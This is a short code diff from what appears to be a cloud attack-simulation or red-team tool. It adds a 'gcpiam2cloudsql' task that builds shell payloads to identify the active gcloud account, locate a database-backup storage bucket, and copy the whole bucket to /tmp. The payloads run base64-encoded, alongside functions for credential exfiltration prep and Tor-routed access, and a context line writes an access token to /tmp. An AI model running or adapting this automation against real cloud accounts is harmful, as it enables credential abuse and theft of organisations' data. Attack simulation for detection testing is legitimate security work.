@@ -442,14 +442,31 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
             elif task_name == "gcpiam2cloudsql":
                 csp = "gcp"
                 enum_exfil_prep_creds(csp, task_name)
+                # storage not available via tor network - region exclusion so we need to do this locally :(
+                payload = """
+USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
+DEPLOYMENT=$(echo ${USER##*-})
+BUCKET_URL=$(gsutil ls | grep db-backup-target-$DEPLOYMENT)
+echo $BUCKET_URL
+"""
+                session.log("payload loaded and ready")
+                result = run_base64_payload(
+                    session=session, payload=payload, log_name="payload_bucket_url")
+                session.log(result)
+                bucket_url = str(result.stdout).strip()
                 session.log("running credentialed_access_tor...")
                 credentialed_access_tor(
                     csp=csp,
                     jobname=task_name,
                     cwd=f'/{task_name}',
                     script=f'{task_name}.sh',
-                    args=""
+                    args=f"--bucket-url={bucket_url}"
                 )
+                payload = f"gsutil cp -r {bucket_url} /tmp 2>&1 | tee -a $LOGFILE"
+                session.log("payload loaded and ready")
+                result = run_base64_payload(
+                    session=session, payload=payload, log_name="payload_retrieve_backup")
+                session.log(result)
                 session.log("credentialed_access_tor complete")
             elif task_name == "socksscan":
                 socks_scan(session)
